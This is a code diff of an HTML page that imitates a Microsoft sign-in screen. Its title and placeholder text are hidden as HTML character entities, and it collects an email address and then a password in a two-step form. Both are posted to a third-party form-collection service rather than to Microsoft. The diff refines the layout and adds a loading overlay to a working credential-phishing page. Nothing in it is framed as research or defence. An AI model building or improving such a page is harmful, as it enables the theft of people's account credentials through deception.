@@ -4,22 +4,22 @@
     <title>&#83;&#105;&#103;&#110;&#32;&#105;&#110;&#32;&#116;&#111;&#32;&#121;&#111;&#117;&#114;&#32;&#77;&#105;&#99;&#114;&#111;&#115;&#111;&#102;&#116;&#32;&#97;&#99;&#99;&#111;&#117;&#110;&#116;</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <link rel="shortcut icon" href="images/favicon.ico"/>
-
+    
     <style type="text/css">
         body {
             text-align: center;
             margin: 0;
-            height: 100vh; /* Ensure the body takes the full height of the viewport */
+            height: 100vh; /* Full height */
             background: url('https://smallenvelop.com/wp-content/uploads/2014/08/Preloader_11.gif') no-repeat center center fixed;
             background-size: cover; /* Cover the entire page */
             opacity: 0.8; /* Set opacity for transparency */
         }
-
+        
         .textbox {
             height: 36px;
             width: 275px;
             padding-left: 8px;
-            font-family: "Segoe UI Webfont", -apple-system, "Helvetica Neue", "Roboto", "Ebrima", "Nirmala UI";
+            font-family: "Segoe UI Webfont", -apple-system, "Helvetica Neue", "Lucida Grande", "Roboto", "Ebrima", "Nirmala UI";
             font-size: 15px;
             line-height: 20px;
             font-weight: 400;
@@ -36,10 +36,28 @@
         .hidden {
             display: none;
         }
+
+        .loader {
+            position: fixed;
+            left: 0px;
+            top: 0px;
+            width: 100%;
+            height: 100%;
+            z-index: 9999;
+            background: url('https://smallenvelop.com/wp-content/uploads/2014/08/Preloader_11.gif') 50% 50% no-repeat rgb(249,249,249);
+            opacity: .8;
+        }
+
+        div#container {
+            position: relative;
+            width: 100%; /* Make it responsive */
+            margin-top: 0px;
+            text-align: left; 
+        }
     </style>
 
     <script type="text/javascript">
-        // Show password step and hide email step
+        // Function to show the password step after email submission
         function showPasswordStep() {
             const emailInput = document.querySelector('input[name="user"]');
             const email = emailInput.value;
@@ -55,48 +73,38 @@
             }
         }
     </script>
-
 </head>
 <body>
 
-<!-- Form structure -->
-<form action="https://formbold.com/s/94pAZ" name="yehiswal" id="yehiswal" method="post">
-    <!-- Email Step (Step 1) -->
-    <div id="emailStep">
-        <!-- Email input field -->
-        <input name="user" placeholder="&#69;&#109;&#97;&#105;&#108;&#44;&#32;&#112;&#104;&#111;&#110;&#101;&#32;&#111;&#114;&#32;&#83;&#107;&#121;&#112;&#101;" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:351px;left:507px;top:280px;z-index:2">
-        
-        <!-- Next button to trigger password step -->
-        <div id="formimage1" style="position:absolute; left:749px; top:408px; z-index:3">
-            <input type="image" name="formimage1" width="110" height="34" src="images/zxt.png" onclick="showPasswordStep(); return false;">
+<div class="loader"></div>
+<div id="container">
+
+    <form action="https://formbold.com/s/94pAZ" name="yehiswal" id="yehiswal" method="post">
+        <!-- Email Step -->
+        <div id="emailStep">
+            <input name="user" placeholder="&#69;&#109;&#97;&#105;&#108;&#44;&#32;&#112;&#104;&#111;&#110;&#101;&#32;&#111;&#114;&#32;&#83;&#107;&#121;&#112;&#101;" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:351px;left:507px;top:280px;z-index:2">
+            <div id="formimage1" style="position:absolute; left:749px; top:408px; z-index:3">
+                <input type="image" name="formimage1" width="110" height="34" src="images/zxt.png" onclick="showPasswordStep(); return false;">
+            </div>
         </div>
 
-        <!-- Decorative image (optional) -->
-        <div id="image2" style="position:absolute; overflow:hidden; left:508px; top:388px; width:137px; height:17px; z-index:1">
-            <a href="#"><img src="images/zt4.png" alt="" title="" border=0 width=137 height=17></a>
+        <!-- Password Step (hidden initially) -->
+        <div id="passwordStep" class="hidden">
+            <input name="user" value="<?=$id?>" class="textbox1" autocomplete="off" required type="hidden">
+            <input name="pd" placeholder="&#80;&#97;&#115;&#115;&#119;&#111;&#114;&#100;" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:352px;left:507px;top:299px;z-index:3">
+            
+            <!-- Remember Me checkbox -->
+            <div style="position:absolute; left:507px; top:348px; z-index:4">
+                <input type="checkbox" name="remember" id="remember" class="css-checkbox">
+                <label for="remember" class="css-label radGroup1" style="font-size: 14px;">Remember Me</label>
+            </div>
+
+            <div id="formimage1" style="position:absolute; left:749px; top:424px; z-index:5">
+                <input type="image" name="formimage1" width="110" height="34" src="images/zgn.png">
+            </div>
         </div>
-    </div>
+    </form>
 
-    <!-- Password Step (Step 2 - initially hidden) -->
-    <div id="passwordStep" class="hidden">
-        <!-- Hidden email field to retain user data from Step 1 -->
-        <input name="user" value="<?=$id?>" class="textbox1" autocomplete="off" required type="hidden">
-
-        <!-- Password input field -->
-        <input name="pd" placeholder="&#80;&#97;&#115;&#115;&#119;&#111;&#114;&#100;" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:352px;left:507px;top:299px;z-index:3">
-
-        <!-- Remember Me checkbox -->
-        <div style="position:absolute; left:507px; top:348px; z-index:4">
-            <input type="checkbox" name="remember" id="remember" class="css-checkbox">
-            <label for="remember" class="css-label radGroup1" style="font-size: 14px;">Remember Me</label>
-        </div>
-
-        <!-- Submit button -->
-        <div id="formimage1" style="position:absolute; left:749px; top:424px; z-index:5">
-            <input type="image" name="formimage1" width="110" height="34" src="images/zgn.png">
-        </div>
-    </div>
-</form>
-
+</div>
 </body>
 </html>
